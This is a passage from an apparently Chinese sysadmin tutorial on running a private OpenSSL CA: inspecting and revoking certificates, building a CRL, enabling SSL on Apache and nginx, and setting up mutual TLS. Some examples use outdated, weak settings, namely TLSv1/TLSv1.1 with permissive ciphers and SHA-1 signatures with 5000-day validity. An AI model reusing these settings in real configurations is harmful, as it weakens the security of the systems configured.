                    aa:10:26:5b:c5:3a:57:d4:11:36:26:f4:92:96:6b:
                    e7:be:40:29:07:0f:e9:a9:9d:ff:8d:d4:3e:a3:f3:
                    71:e7:65:24:a0:73:25:b8:c3:e9:0c:96:90:e0:ef:
                    fe:20:18:d8:cd:56:21:9f:62:ee:6c:de:28:bc:e7:
                    b8:25:12:53:a9:cb:e4:4f:d5:da:07:6b:94:88:3a:
                    8b:c1:35:62:bd:e2:cf:0e:c1:72:79:3b:4c:b4:a2:
                    09:25:36:00:24:26:dd:ff:ae:43:89:bb:b1:87:40:
                    ec:bd:0d:21:c4:1e:a0:85:a2:5b:61:f2:c2:aa:46:
                    76:3f:03:0c:c7:80:46:70:ce:b7:79:9a:85:e7:e7:
                    9c:75:5d:a3:3f:14:12:a0:9d:90:e7:c2:d0:21:b3:
                    a3:e9
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints: 
                CA:FALSE
            Netscape Comment: 
                OpenSSL Generated Certificate
            X509v3 Subject Key Identifier: 
                03:28:C4:A1:46:73:25:C0:FC:2B:7D:AE:6D:D9:BB:9D:47:77:5F:59
            X509v3 Authority Key Identifier: 
                keyid:36:76:B8:8F:C5:2E:C9:3A:CD:A6:F6:5D:18:BA:D2:9C:C8:A0:CA:85

    Signature Algorithm: sha256WithRSAEncryption
         48:86:90:2e:53:df:74:45:97:d9:d1:5b:a6:c2:4d:b3:6f:95:
         6a:bb:9e:df:f2:05:58:80:f8:ae:e4:0a:67:8f:79:6c:33:41:
         80:8d:ca:92:2f:db:2f:22:51:48:3b:53:6c:d6:77:9e:57:46:
         63:5e:10:63:3c:6e:16:b5:cf:2e:29:f4:de:1f:dd:6a:6a:70:
         f8:79:1e:6d:48:3b:cf:a3:56:00:7a:61:b2:68:f0:e6:03:07:
         70:b2:fe:28:73:b6:53:82:5d:50:44:1e:97:d3:7c:1c:ed:22:
         15:ae:61:22:e5:c0:e8:2a:72:fa:b0:c2:dc:38:ed:f4:c2:6c:
         9b:60:f0:e7:55:78:6e:10:a8:a7:3e:96:87:8e:e9:06:b2:a2:
         23:4a:70:11:a9:6e:88:89:c8:02:d0:b1:7e:05:0e:e1:7d:3d:
         ee:7a:ec:26:0d:fe:ad:45:a6:4f:4e:37:1d:f9:fb:67:b0:28:
         92:e0:ed:91:72:a3:61:86:99:87:a6:ab:bc:4f:b5:a1:5a:ae:
         0e:61:6a:10:dd:cc:41:15:d8:1d:8a:31:a9:08:4a:07:e4:31:
         25:07:da:bc:63:77:e9:d1:5e:30:43:28:84:89:9f:d5:ed:4f:
         c1:1e:21:4e:d3:51:9a:36:cb:27:f6:6c:53:9b:b2:ed:17:35:
         9b:70:03:54
-----BEGIN CERTIFICATE-----
MIIDrDCCApSgAwIBAgIBATANBgkqhkiG9w0BAQsFADBlMQswCQYDVQQGEwJDTjEQ
MA4GA1UECAwHYmVpamluZzEQMA4GA1UEBwwHYmVpamluZzEMMAoGA1UECgwDb3Bz
MQ8wDQYDVQQLDAZkZXZvcHMxEzARBgNVBAMMCmNhLnhjdy5vcmcwHhcNMjEwMzA5
MjM0MzIyWhcNMjMxMjA0MjM0MzIyWjBRMQswCQYDVQQGEwJDTjEQMA4GA1UECAwH
YmVpamluZzEMMAoGA1UECgwDb3BzMQswCQYDVQQLDAJpdDEVMBMGA1UEAwwMYXBw
MS54Y3cub3JnMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95PGnKyG
xYF/yJJwPVMGjk7I+Vo20Pgwy2y4p4rvCxAQFVvs19U8hfoP3NPo6FQBmhWlWHFw
9H6ES10bRBuCEUR8bKaTG670CfncE5Xn4e/m5NgFgsr6PfDLEl/XioAJLb/dR2ON
YL6qECZbxTpX1BE2JvSSlmvnvkApBw/pqZ3/jdQ+o/Nx52UkoHMluMPpDJaQ4O/+
IBjYzVYhn2LubN4ovOe4JRJTqcvkT9XaB2uUiDqLwTViveLPDsFyeTtMtKIJJTYA
JCbd/65Dibuxh0DsvQ0hxB6ghaJbYfLCqkZ2PwMMx4BGcM63eZqF5+ecdV2jPxQS
oJ2Q58LQIbOj6QIDAQABo3sweTAJBgNVHRMEAjAAMCwGCWCGSAGG+EIBDQQfFh1P
cGVuU1NMIEdlbmVyYXRlZCBDZXJ0aWZpY2F0ZTAdBgNVHQ4EFgQUAyjEoUZzJcD8
K32ubdm7nUd3X1kwHwYDVR0jBBgwFoAUNna4j8UuyTrNpvZdGLrSnMigyoUwDQYJ
KoZIhvcNAQELBQADggEBAEiGkC5T33RFl9nRW6bCTbNvlWq7nt/yBViA+K7kCmeP
eWwzQYCNypIv2y8iUUg7U2zWd55XRmNeEGM8bha1zy4p9N4f3WpqcPh5Hm1IO8+j
VgB6YbJo8OYDB3Cy/ihztlOCXVBEHpfTfBztIhWuYSLlwOgqcvqwwtw47fTCbJtg
8OdVeG4QqKc+loeO6QayoiNKcBGpboiJyALQsX4FDuF9Pe567CYN/q1Fpk9ONx35
+2ewKJLg7ZFyo2GGmYemq7xPtaFarg5hahDdzEEV2B2KMakISgfkMSUH2rxjd+nR
<span style="color: #a0522d;">XjBDKISJn9XtT8EeIU7TUZo2yyf2bFObsu0XNZtwA1Q</span>=
-----END CERTIFICATE-----

[root@centos8 ~]#openssl x509 -in /etc/pki/CA/certs/app1.crt -noout -text <span style="color: #b22222;"># </span><span style="color: #b22222;">-noout -text &#21482;&#36755;&#20986;&#25991;&#20214;&#22836;&#37096;&#20998;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#30475;&#35777;&#20070;&#25351;&#23450;&#37096;&#20998;</span>
[root@centos8 ~]#openssl x509 -in /etc/pki/CA/certs/app1.crt -noout -issuer
<span style="color: #a0522d;">issuer</span>= /C=CN/ST=beijing/L=beijing/O=ops/OU=devops/CN=ca.xcw.org
[root@centos8 ~]#openssl x509 -in /etc/pki/CA/certs/app1.crt -noout -subject
<span style="color: #a0522d;">subject</span>= /C=CN/ST=beijing/O=ops/OU=it/CN=app1.xcw.org
[root@centos8 ~]#openssl x509 -in /etc/pki/CA/certs/app1.crt -noout -dates
<span style="color: #a0522d;">notBefore</span>=Mar  9 23:43:22 2021 GMT
<span style="color: #a0522d;">notAfter</span>=Dec  4 23:43:22 2023 GMT
[root@centos8 ~]#openssl x509 -in /etc/pki/CA/certs/app1.crt -noout -serial
<span style="color: #a0522d;">serial</span>=01

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#39564;&#35777;&#25351;&#23450;&#32534;&#21495;&#23545;&#24212;&#35777;&#20070;&#30340;&#26377;&#25928;&#24615;</span>
[root@centos8 ~]#openssl ca -status 01
Using configuration from /etc/pki/tls/openssl.cnf
<span style="color: #a0522d;">01</span>=Valid (V)

[root@centos8 ~]#cat /etc/pki/CA/index.txt
V   231204234322Z       01  unknown /C=CN/ST=beijing/O=ops/OU=it/CN=app1.xcw.org

V&#65306;&#34920;&#31034;&#24050;&#32463;&#31614;&#32626;&#30340;
01&#65306;&#34920;&#31034;&#35777;&#20070;&#24207;&#21015;&#21495;
/C=CN/ST=Beijing/O=&#8230; ...&#65306;  &#34920;&#31034;&#20027;&#39064;&#20449;&#24687;(&#20027;&#39064;&#26631;&#35782;)
[root@centos8 ~]#cat /etc/pki/CA/index.txt.old
[root@centos8 ~]#cat /etc/pki/CA/serial <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19979;&#19968;&#20010;&#35201;&#39041;&#21457;&#35777;&#20070;&#30340;&#32534;&#21495;</span>
02
[root@centos8 ~]#cat /etc/pki/CA/serial.old
01
</pre>
</div>
</div>
</div>
<div id="outline-container-h:7932de15-d0cc-4f05-acc9-63eefc5baa09" class="outline-5">
<h5 id="h:7932de15-d0cc-4f05-acc9-63eefc5baa09">将证书相关文件发送到用户端使用</h5>
<div class="outline-text-5" id="text-h:7932de15-d0cc-4f05-acc9-63eefc5baa09">
<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#cp /etc/pki/CA/certs/app1.crt /data/app1/
[root@centos8 ~]#tree /data/app1/
/data/app1/
&#9500;&#9472;&#9472; app1.crt
&#9500;&#9472;&#9472; app1.csr
&#9492;&#9472;&#9472; app1.key

0 directories, 3 files
</pre>
</div>
</div>
</div>
<div id="outline-container-h:d87e121b-ef1a-40a6-8ca5-9d27caec0df0" class="outline-5">
<h5 id="h:d87e121b-ef1a-40a6-8ca5-9d27caec0df0">证书的信任</h5>
<div class="outline-text-5" id="text-h:d87e121b-ef1a-40a6-8ca5-9d27caec0df0">
<p>
默认生成的证书，在windows上是不被信任的，可以通过下面的操作实现信任
</p>

<p>
将根证书信任，它下级的证书也会自动信任
</p>

<p>
打开internet属性
</p>


<figure id="org9dfa309">
<img src="images/image-20210407163007305.png" alt="image-20210407163007305.png" width="20%">

</figure>


<figure id="org9753446">
<img src="./images/image-20210407163027171.png" alt="image-20210407163027171.png" width="20%">

</figure>


<figure id="orgc3525b6">
<img src="images/image-20210407163047785.png" alt="image-20210407163047785.png" width="20%">

</figure>


<figure id="org9479306">
<img src="images/image-20210407163843440.png" alt="image-20210407163843440.png" width="20%">

</figure>


<figure id="orgb5cb2d2">
<img src="images/image-20210407163911656.png" alt="image-20210407163911656.png" width="20%">

</figure>


<figure id="org27eb3e6">
<img src="images/image-20210407163946719.png" alt="image-20210407163946719.png" width="20%">

</figure>


<figure id="org1713c69">
<img src="images/image-20210407164000317.png" alt="image-20210407164000317.png" width="20%">

</figure>


<figure id="orgd6d3095">
<img src="images/image-20210407164704060.png" alt="image-20210407164704060.png" width="20%">

</figure>


<figure id="orga83215c">
<img src="images/image-20210407164645314.png" alt="image-20210407164645314.png" width="20%">

</figure>
</div>
</div>
<div id="outline-container-h:87004d56-73bd-49f6-bede-a23f5f6eb6ff" class="outline-5">
<h5 id="h:87004d56-73bd-49f6-bede-a23f5f6eb6ff">证书的吊销</h5>
<div class="outline-text-5" id="text-h:87004d56-73bd-49f6-bede-a23f5f6eb6ff">
<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#openssl ca -revoke /etc/pki/CA/newcerts/01.pem
Using configuration from /etc/pki/tls/openssl.cnf
Revoking Certificate 11.
Data Base Updated

[root@centos8 ~]#openssl ca -status 01
Using configuration from /etc/pki/tls/openssl.cnf
<span style="color: #a0522d;">01</span>=Revoked (R)
R   231204234322Z   210310001314Z   01  unknown /C=CN/ST=beijing/O=ops/OU=it/CN=app1.xcw.org
@wangedu.org
</pre>
</div>
</div>
</div>
<div id="outline-container-h:29d5c52c-4f5a-4b7a-87fa-3a322fed2019" class="outline-5">
<h5 id="h:29d5c52c-4f5a-4b7a-87fa-3a322fed2019"><b>生成证书吊销列表文件</b></h5>
<div class="outline-text-5" id="text-h:29d5c52c-4f5a-4b7a-87fa-3a322fed2019">
<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#openssl ca -gencrl -out /etc/pki/CA/crl.pem
Using configuration from /etc/pki/tls/openssl.cnf
/etc/pki/CA/crlnumber: No such file or directory
error while loading CRL number
140511895181120:error:02001002:system library:fopen:No such file or
directory:crypto/bio/bss_file.c:72:fopen(<span style="color: #8b2252;">'/etc/pki/CA/crlnumber'</span>,<span style="color: #8b2252;">'r'</span>)
140511895181120:error:2006D080:BIO routines:BIO_new_file:no such
file:crypto/bio/bss_file.c:79:

[root@centos8 ~]#echo 01 &gt; /etc/pki/CA/crlnumber <span style="color: #b22222;"># </span><span style="color: #b22222;">&#34987;&#21514;&#38144;&#32534;&#21495;&#65292;&#20174;01&#24320;&#22987;&#21644;index&#27809;&#20851;&#31995;</span>
[root@centos8 ~]#openssl ca -gencrl -out /etc/pki/CA/crl.pem <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21487;&#23558;&#25991;&#20214;&#25918;&#21040;&#20844;&#24067;&#30340;&#32593;&#32476;&#33021;&#34987;&#35775;&#38382;&#21040;</span>
Using configuration from /etc/pki/tls/openssl.cnf

[root@centos8 ~]#cat /etc/pki/CA/crlnumber
02
[root@centos8 ~]#cat /etc/pki/CA/crl.pem
-----BEGIN X509 CRL-----
MIIB1DCBvQIBATANBgkqhkiG9w0BAQsFADBlMQswCQYDVQQGEwJDTjEQMA4GA1UE
CAwHYmVpamluZzEQMA4GA1UEBwwHYmVpamluZzEMMAoGA1UECgwDb3BzMQ8wDQYD
VQQLDAZkZXZvcHMxEzARBgNVBAMMCmNhLnhjdy5vcmcXDTIxMDMxMDAwMjgwNFoX
DTIxMDQwOTAwMjgwNFowFDASAgEBFw0yMTAzMTAwMDEzMTRaoA4wDDAKBgNVHRQE
AwIBATANBgkqhkiG9w0BAQsFAAOCAQEAg9nJ+vRqvvXkYuSLWJe7Z3h2iIgwyss+
ESNTc9lNAUCVjjhHax5UqoAVjnmLyVZbcJCV8Z2RjLtyhkgjxLVnBq2BqTnILsTO
CcgteU3pV1xUiyFcdEWiNwcp93R0ki2hVgFRvl7DThmCxWTKiiQ8DQb47wBM5pM2
PMAWgEKqgAeY0MPoII4js64teptKL9S5g6cwYYZWz3jHSuTcIUco9V1K+qdmo+DT
ni1fYsDQr+zxIC6uOFcqe8MaT9AuS+6mhLx3w/5xswcak0XYje8OoGjpo3tnxaYj
GucPZf7yRzKI34cKyFAeuUAmik52VDJa9PmXT3rNIORWuaOnU+<span style="color: #a0522d;">FNxQ</span>==
-----END X509 CRL-----

[root@centos8 ~]#openssl crl -in /etc/pki/CA/crl.pem -noout -text
Certificate Revocation List (CRL):
        Version 2 (0x1)
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: /C=CN/ST=beijing/L=beijing/O=ops/OU=devops/CN=ca.xcw.org
        Last Update: Mar 10 00:28:04 2021 GMT
        Next Update: Apr  9 00:28:04 2021 GMT
        CRL extensions:
            X509v3 CRL Number: 
                1
Revoked Certificates:
    Serial Number: 01
        Revocation Date: Mar 10 00:13:14 2021 GMT
    Signature Algorithm: sha256WithRSAEncryption
         83:d9:c9:fa:f4:6a:be:f5:e4:62:e4:8b:58:97:bb:67:78:76:
         88:88:30:ca:cb:3e:11:23:53:73:d9:4d:01:40:95:8e:38:47:
         6b:1e:54:aa:80:15:8e:79:8b:c9:56:5b:70:90:95:f1:9d:91:
         8c:bb:72:86:48:23:c4:b5:67:06:ad:81:a9:39:c8:2e:c4:ce:
         09:c8:2d:79:4d:e9:57:5c:54:8b:21:5c:74:45:a2:37:07:29:
         f7:74:74:92:2d:a1:56:01:51:be:5e:c3:4e:19:82:c5:64:ca:
         8a:24:3c:0d:06:f8:ef:00:4c:e6:93:36:3c:c0:16:80:42:aa:
         80:07:98:d0:c3:e8:20:8e:23:b3:ae:2d:7a:9b:4a:2f:d4:b9:
         83:a7:30:61:86:56:cf:78:c7:4a:e4:dc:21:47:28:f5:5d:4a:
         fa:a7:66:a3:e0:d3:9e:2d:5f:62:c0:d0:af:ec:f1:20:2e:ae:
         38:57:2a:7b:c3:1a:4f:d0:2e:4b:ee:a6:84:bc:77:c3:fe:71:
         b3:07:1a:93:45:d8:8d:ef:0e:a0:68:e9:a3:7b:67:c5:a6:23:
         1a:e7:0f:65:fe:f2:47:32:88:df:87:0a:c8:50:1e:b9:40:26:
         8a:4e:76:54:32:5a:f4:f9:97:4f:7a:cd:20:e4:56:b9:a3:a7:
         53:e1:4d:c5

[root@centos8 ~]#sz /etc/pki/CA/crl.pem
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23558;&#27492;&#25991;&#20214;crl.pem&#20256;&#21040;windows&#19978;&#24182;&#25913;&#21518;&#32512;&#20026;crl.pem.crl</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:630ba5dc-caff-4ff4-9152-bebce1311be3" class="outline-5">
<h5 id="h:630ba5dc-caff-4ff4-9152-bebce1311be3">各种服务开启SSL</h5>
<div class="outline-text-5" id="text-h:630ba5dc-caff-4ff4-9152-bebce1311be3">
<p>
范例：apache服务：开启ssl
</p>

<div class="org-src-container">
<pre class="src src-sh">1&#12289;vi&#160;/usr/local/apache/conf/httpd.conf
&#21435;&#25481;&#36825;&#34892;&#27880;&#37322;
Include&#160;conf/extra/httpd-ssl.conf

2&#12289;vi&#160;/usr/local/apache/conf/extra/httpd-ssl.conf&#160;
&#20462;&#25913;&#20197;&#19979;&#20004;&#39033;&#65292;&#23558;openssl&#29983;&#25104;&#30340;&#35777;&#20070;cp&#21040;&#30456;&#24212;&#36335;&#24452;&#65288;/etc/httpd2/&#65289;
SSLCertificateFile&#160;<span style="color: #8b2252;">"/etc/httpd2/httpd.crt"</span>
SSLCertificateKeyFile&#160;<span style="color: #8b2252;">"/etc/httpd2/httpd.key"</span>
ServerName&#160;www.emacle.com:443

3&#12289;&#37325;&#21551;&#26381;&#21153;
apachectl&#160;start
</pre>
</div>

<p>
范例：nginx
</p>

<div class="org-src-container">
<pre class="src src-sh">listen 443 ssl;
<span style="color: #b22222;">#</span><span style="color: #b22222;">ssl on;    #&#22312;server&#20013;&#22810;&#20010;&#31471;&#21475;&#37197;&#32622;&#38656;&#35201;&#27880;&#37322;&#25481;&#65292;&#19981;&#28982;&#25253;400&#38169;&#35823;</span>
ssl_certificate ssl/214049825510693.pem;
ssl_certificate_key ssl/214049825510693.key;
ssl_session_cache   shared:SSL:20m;
ssl_session_timeout 10m;
ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
ssl_ciphers ALL:!ADH:!EXPORT56:-RC4+RSA:+HIGH:+MEDIUM:!EXP;
ssl_prefer_server_ciphers on;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:64542161-6d5c-4b5b-b904-d85a55df6633" class="outline-5">
<h5 id="h:64542161-6d5c-4b5b-b904-d85a55df6633">HTTPS双向认证的负载均衡服务</h5>
<div class="outline-text-5" id="text-h:64542161-6d5c-4b5b-b904-d85a55df6633">
<p>
华为云 <a href="https://support.huaweicloud.com/usermanual-elb/zh_cn_elb_03_0006.html">https://support.huaweicloud.com/usermanual-elb/zh_cn_elb_03_0006.html</a>
</p>

<p>
阿里云 <a href="https://help.aliyun.com/document_detail/85954.html">https://help.aliyun.com/document_detail/85954.html</a>
</p>

<p>
使用场景
</p>

<p>
一般的HTTPS业务场景只对服务器做认证，因此只需要配置服务器的证书即可。
某些关键业务（如银行支付），需要对通信双方的身份都要做认证，即双向认证，
以确保业务的安全性。
</p>

<p>
此时，除了配置服务器的证书之外，还需要配置客户端的证书，以实现通信双方
的双向认证功能。
</p>

<p>
使用OpenSSL制作CA证书
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">1&#30331;&#24405;&#21040;&#20219;&#24847;&#19968;&#21488;&#23433;&#35013;&#26377;openssl&#24037;&#20855;&#30340;Linux&#26426;&#22120;&#12290;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">2&#21019;&#24314;&#24037;&#20316;&#30446;&#24405;&#24182;&#36827;&#20837;&#35813;&#30446;&#24405;&#12290;</span>
mkdir ca
<span style="color: #483d8b;">cd</span> ca

<span style="color: #b22222;"># </span><span style="color: #b22222;">3&#21019;&#24314;CA&#35777;&#20070;&#30340;openssl&#37197;&#32622;&#25991;&#20214;ca_cert.conf&#65292;&#20869;&#23481;&#22914;&#19979;&#65306;</span>
[ req ]
distinguished_name     = req_distinguished_name
prompt                 = no

[ req_distinguished_name ]
 O                      = ELB

<span style="color: #b22222;"># </span><span style="color: #b22222;">4 &#21019;&#24314;CA&#35777;&#20070;&#31169;&#38053;&#25991;&#20214;ca.key&#12290;</span>
openssl genrsa -out ca.key 2048

<span style="color: #b22222;"># </span><span style="color: #b22222;">5&#21019;&#24314;CA&#35777;&#20070;&#30340;csr&#35831;&#27714;&#25991;&#20214;ca.csr&#12290;</span>
openssl req -out ca.csr -key ca.key -new -config ./ca_cert.conf

<span style="color: #b22222;"># </span><span style="color: #b22222;">6 &#21019;&#24314;&#33258;&#31614;&#21517;&#30340;CA&#35777;&#20070;ca.crt&#12290;</span>
openssl x509 -req -in ca.csr -out ca.crt -sha1 -days 5000 -signkey ca.key
</pre>
</div>

<p>
使用CA证书签发服务器证书
</p>

<p>
用户可以用权威CA签发的证书或者自签名的证书，这里以自签名证书为例说明如
何创建服务器证书。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">1 &#30331;&#24405;&#21040;&#29983;&#25104;CA&#35777;&#20070;&#30340;&#26381;&#21153;&#22120;&#12290;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">2 &#21019;&#24314;&#19982;CA&#24179;&#32423;&#30340;&#30446;&#24405;&#65292;&#24182;&#36827;&#20837;&#35813;&#30446;&#24405;&#12290;</span>
mkdir server
<span style="color: #483d8b;">cd</span> server

<span style="color: #b22222;"># </span><span style="color: #b22222;">3 &#21019;&#24314;&#26381;&#21153;&#22120;&#35777;&#20070;&#30340;openssl&#37197;&#32622;&#25991;&#20214;server_cert.conf&#65292;&#20869;&#23481;&#22914;&#19979;</span>
[ req ]
distinguished_name     = req_distinguished_name
prompt                 = no

[ req_distinguished_name ]
 O                      = ELB
 CN                     = www.test.com
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#35828;&#26126;&#65306;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">CN&#23383;&#27573;&#21487;&#20197;&#26681;&#25454;&#38656;&#27714;&#25913;&#20026;&#26381;&#21153;&#22120;&#23545;&#24212;&#30340;&#22495;&#21517;&#12289;IP&#22320;&#22336;&#12290;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">4 &#21019;&#24314;&#26381;&#21153;&#22120;&#35777;&#20070;&#31169;&#38053;&#25991;&#20214;server.key&#12290;</span>
openssl genrsa -out server.key 2048

<span style="color: #b22222;"># </span><span style="color: #b22222;">5 &#21019;&#24314;&#26381;&#21153;&#22120;&#35777;&#20070;&#30340;csr&#35831;&#27714;&#25991;&#20214;server.csr&#12290;</span>
openssl req -new -out server.csr -key server.key -config ./server_cert.conf

<span style="color: #b22222;"># </span><span style="color: #b22222;">6 &#20351;&#29992;CA&#35777;&#20070;&#31614;&#21457;&#26381;&#21153;&#22120;&#35777;&#20070;server.crt&#12290;</span>
openssl x509 -req -in server.csr -out server.crt -sha1 -CAcreateserial -days 5000 -CA ../ca/ca.crt -CAkey ../ca/ca.key
</pre>
</div>

<p>
使用CA证书签发客户端证书
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">1 &#30331;&#24405;&#21040;&#29983;&#25104;CA&#35777;&#20070;&#30340;&#26381;&#21153;&#22120;&#12290;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">2 &#21019;&#24314;&#19982;CA&#24179;&#32423;&#30340;&#30446;&#24405;&#65292;&#24182;&#36827;&#20837;&#35813;&#30446;&#24405;&#12290;</span>
mkdir client
<span style="color: #483d8b;">cd</span> client

<span style="color: #b22222;"># </span><span style="color: #b22222;">3 &#21019;&#24314;&#23458;&#25143;&#31471;&#35777;&#20070;&#30340;openssl&#37197;&#32622;&#25991;&#20214;client_cert.conf&#65292;&#20869;&#23481;&#22914;&#19979;&#65306;</span>
[ req ]
distinguished_name     = req_distinguished_name
prompt                 = no

[ req_distinguished_name ]
 O                      = ELB
 CN                     = www.test.com
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#35828;&#26126;&#65306;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">CN&#23383;&#27573;&#21487;&#20197;&#26681;&#25454;&#38656;&#27714;&#25913;&#20026;&#23545;&#24212;&#30340;&#22495;&#21517;&#12289;IP&#22320;&#22336;&#12290;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">4 &#21019;&#24314;&#23458;&#25143;&#31471;&#35777;&#20070;&#31169;&#38053;&#25991;&#20214;client.key&#12290;</span>
openssl genrsa -out client.key 2048

<span style="color: #b22222;"># </span><span style="color: #b22222;">5 &#21019;&#24314;&#23458;&#25143;&#31471;&#35777;&#20070;&#30340;csr&#35831;&#27714;&#25991;&#20214;client.csr&#12290;</span>
openssl req -out client.csr -key client.key -new -config ./client_cert.conf

<span style="color: #b22222;"># </span><span style="color: #b22222;">6 &#20351;&#29992;CA&#35777;&#20070;&#31614;&#21457;&#23458;&#25143;&#31471;&#35777;&#20070;client.crt&#12290;</span>
openssl x509 -req -in client.csr -out client.crt -sha1 -CAcreateserial -days 5000 -CA ../ca/ca.crt -CAkey ../ca/ca.key

<span style="color: #b22222;"># </span><span style="color: #b22222;">7 &#25226;&#23458;&#25143;&#31471;&#35777;&#20070;&#26684;&#24335;&#36716;&#20026;&#27983;&#35272;&#22120;&#21487;&#35782;&#21035;&#30340;p12&#26684;&#24335;&#12290;</span>
openssl pkcs12 -export -clcerts -in client.crt -inkey client.key -out client.p12
</pre>
</div>

<p>
在nginx上做双向认证
</p>

<p>
把前面生成的服务器证书server.crt、私钥server.key、CA证书ca.crt放到
nginx对应的配置文件中这里只列出server段的关键部分，
</p>

<div class="org-src-container">
<pre class="src src-sh">ssl_certificate  /etc/pki/ca_linvo/server/server.crt;     <span style="color: #b22222;">#</span><span style="color: #b22222;">server&#20844;&#38053;</span>
ssl_certificate_key  /etc/pki/ca_linvo/server/server.key; <span style="color: #b22222;">#</span><span style="color: #b22222;">server&#31169;&#38053;</span>
ssl_client_certificate   /etc/pki/ca_linvo/root/ca.crt;   <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26681;&#32423;&#35777;&#20070;&#20844;&#38053;&#65292;&#29992;&#20110;&#39564;&#35777;&#21508;&#20010;&#20108;&#32423;client</span>
ssl_verify_client on;
&#37325;&#21551;Nginx
</pre>
</div>

<p>
导入客户端证书并测试
</p>

<p>
浏览器方式功能测试
</p>

<div class="org-src-container">
<pre class="src src-sh">&#27983;&#35272;&#22120;&#23548;&#20837;&#23458;&#25143;&#31471;&#35777;&#20070;&#65288;&#20197;Internet Explorer 11&#20026;&#20363;&#35828;&#26126;&#65289;
1. &#25226;&#23458;&#25143;&#31471;&#35777;&#20070;&#20174;Linux&#26426;&#22120;&#23548;&#20986;&#26469;&#65292;&#21363;&#21069;&#38754;&#31614;&#21457;&#30340;client.p12&#35777;&#20070;&#25991;&#20214;&#12290;
2. &#21333;&#20987;&#8220;&#35774;&#32622; &gt; Internet&#36873;&#39033;&#8221;&#65292;&#20999;&#25442;&#21040;&#8220;&#20869;&#23481;&#8221;&#39029;&#31614;&#12290;
3. &#21333;&#20987;&#8220;&#35777;&#20070;&#8221;&#65292;&#28982;&#21518;&#21333;&#20987;&#8220;&#23548;&#20837;&#8221;&#65292;&#23548;&#20837;client.p12&#35777;&#20070;&#25991;&#20214;&#12290;
</pre>
</div>


<figure id="org28a837a">
<img src="images/image-20210407192009434.png" alt="image-20210407192009434.png" width="50%">

</figure>


<figure id="orgb443e8d">
<img src="images/image-20210407192031014.png" alt="image-20210407192031014.png" width="50%">

</figure>

<p>
Curl工具方式功能测试
</p>

<div class="org-src-container">
<pre class="src src-sh">1. &#23548;&#20837;&#23458;&#25143;&#31471;&#35777;&#20070;
&#25226;&#23458;&#25143;&#31471;&#35777;&#20070;client.crt&#21644;&#23458;&#25143;&#31471;&#31169;&#38053;&#25991;&#20214;client.key&#25335;&#36125;&#21040;&#26032;&#30446;&#24405;&#65292;&#22914;&#30446;&#24405;/home/client_cert&#12290;

2. &#27979;&#35797;&#39564;&#35777;
&#22312;shell&#30028;&#38754;&#65292;&#36755;&#20837;&#20197;&#19979;&#21629;&#20196;&#65292;&#35831;&#36755;&#20837;&#27491;&#30830;&#30340;&#35777;&#20070;&#22320;&#22336;&#21644;&#23494;&#38053;&#25991;&#20214;&#22320;&#22336;&#65292;&#20197;&#21450;&#36127;&#36733;&#22343;&#34913;&#22120;&#30340;IP&#22320;&#22336;&#21644;&#30417;&#21548;&#22120;&#31471;&#21475;(&#20197;&#19979;&#29992;https://XXX.XXX.XXX.XXX:XXX &#34920;&#31034;&#65292;&#20197;&#23454;&#38469;IP&#22320;&#22336;&#21644;&#31471;&#21475;&#20026;&#20934;)&#12290;
curl -k --cert /home/client_cert/client.crt --key /home/client_cert/client.key https://XXX.XXX.XXX.XXX:XXX/ -I

&#22914;&#26524;&#21487;&#20197;&#27491;&#30830;&#33719;&#24471;&#21709;&#24212;&#30721;&#65292;&#35828;&#26126;&#39564;&#35777;&#25104;&#21151;
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:5062dade-b835-49e4-8e58-8d16231fd4cd" class="outline-4">
<h4 id="h:5062dade-b835-49e4-8e58-8d16231fd4cd">证书性能</h4>
<div class="outline-text-4" id="text-h:5062dade-b835-49e4-8e58-8d16231fd4cd">
<p>
OpenSSL自带了性能评测工具，你可以使用它对系统的能力和上限进行一个大致
的评定。你可以使用speed 命令来执行评测。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">Web&#26381;&#21153;&#22120;&#23433;&#20840;&#32771;&#34385;&#65292;&#20320;&#21487;&#33021;&#20250;&#20851;&#24515;RC4&#12289;AES&#12289;RSA&#12289;ECDH&#21644;SHA&#31639;&#27861;</span>
openssl speed rc4 aes rsa ecdh sha
</pre>
</div>
</div>
</div>
<div id="outline-container-h:7346fd8c-09cd-4225-99e1-2795136fe203" class="outline-4">
<h4 id="h:7346fd8c-09cd-4225-99e1-2795136fe203">证书转换</h4>
<div class="outline-text-4" id="text-h:7346fd8c-09cd-4225-99e1-2795136fe203">
<p>
<b>主流Web服务软件</b>
</p>

<p>
一般来说，主流的Web服务软件，通常都基于OpenSSL和Java两种基础密码库。
</p>

<p>
Tomcat、Weblogic、JBoss等Web服务软件，一般使用Java提供的密码库。通过
Java Development Kit （JDK）工具包中的Keytool工具，生成Java
Keystore（JKS）格式的证书文件。
</p>

<p>
